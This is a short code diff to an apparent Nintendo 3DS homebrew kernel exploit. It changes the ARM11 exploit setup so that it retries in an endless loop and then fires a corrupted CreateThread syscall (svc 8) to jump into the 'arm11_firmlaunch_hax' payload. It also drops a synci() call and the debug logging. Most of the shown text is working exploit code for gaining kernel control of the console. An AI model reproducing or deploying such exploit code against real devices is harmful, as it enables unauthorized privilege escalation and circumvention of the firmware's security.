@@ -280,7 +280,6 @@ int arm11_kernel_exploit_setup(void)
 	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
 	dbg_log("Restoring heap\n");
 	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);
-	synci();
 
 	return 1;
 }
@@ -385,17 +384,12 @@ bool doARM11Hax()
 	dbg_log("Jump table vars 0x%x after jump table\n", (&pdn_regs_0 - &jump_table)*4);
 	dbg_log("Reboot wait at %x\n", 0x1FFF4C80 + (&reboot_wait - &jump_table)*4);
 
-	if (arm11_kernel_exploit_setup())
-	{
-		dbg_log("Kernel exploit set up\n");
+	while (1)
+		if (arm11_kernel_exploit_setup())
+			asm volatile ("ldr r0, =%0\t\n"
+				"svc 8 \t\n" // CreateThread syscall, corrupted, args not needed
+				:: "i"(arm11_firmlaunch_hax)
+				: "r0");
 
-		asm volatile ("ldr r0, =%0\t\n"
-			"svc 8 \t\n" // CreateThread syscall, corrupted, args not needed
-			:: "i"(arm11_firmlaunch_hax)
-			: "r0");
-		dbg_log("ARM11 code passed somehow, ARM9 failed...\n");
-	}
-
-    dbg_log("Kernel exploit set up failed!\n\n");
 	return false;
 }
